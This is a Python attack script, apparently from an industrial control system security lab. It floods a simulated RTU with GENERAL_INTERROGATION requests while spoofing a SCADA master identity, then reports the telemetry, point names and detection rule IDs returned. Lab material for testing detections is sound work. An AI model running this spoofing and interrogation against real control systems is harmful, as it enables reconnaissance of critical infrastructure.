import argparse
import os
import socket
import time

from app.protocol import attack_general_interrogation, decode_message, encode_message


def send_message(host: str, port: int, message: dict) -> dict:
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.sendall(encode_message(message))
        response = b""
        while not response.endswith(b"\n"):
            chunk = sock.recv(65535)
            if not chunk:
                break
            response += chunk
    return decode_message(response)


def main() -> None:
    parser = argparse.ArgumentParser(description="Send repeated GENERAL_INTERROGATION requests directly to the RTU.")
    parser.add_argument("--count", type=int, default=20, help="Number of interrogation requests to send.")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between requests in seconds.")
    parser.add_argument(
        "--mode",
        choices=["spoof-scada", "honest-attacker"],
        default="spoof-scada",
        help="Source identity mode. Default is spoof-scada.",
    )
    args = parser.parse_args()

    host = os.getenv("RTU_HOST", "rtu-simulator")
    port = int(os.getenv("RTU_PORT", "2404"))
    responses = []
    detection_rule_ids: set[str] = set()

    for sequence in range(1, args.count + 1):
        message = attack_general_interrogation(args.mode, sequence=sequence)
        response = send_message(host, port, message)
        responses.append(response)
        for item in ((response.get("payload") or {}).get("detections")) or []:
            if item.get("rule_id"):
                detection_rule_ids.add(item["rule_id"])
        if sequence < args.count:
            time.sleep(args.delay)

    sample_payload = (responses[-1].get("payload") or {}) if responses else {}
    sample_points = sample_payload.get("points") or []
    sample_telemetry = sample_payload.get("telemetry") or {}

    print("GENERAL_INTERROGATION abuse completed")
    print(f"Mode: {args.mode}")
    print(f"Requests sent: {len(responses)}")
    if args.mode == "spoof-scada":
        print("Claimed source: {'id': 'scada-master', 'role': 'SCADA_MASTER'}")
    else:
        print("Claimed source: {'id': 'attacker-node', 'role': 'ATTACKER'}")
    print(f"Sample telemetry: {sample_telemetry}")
    print(f"Sample point count: {len(sample_points)}")
    if sample_points:
        print(f"Sample points: {[point.get('name') for point in sample_points[:5]]}")
    print(f"Detections returned: {sorted(detection_rule_ids)}")


if __name__ == "__main__":
    main()
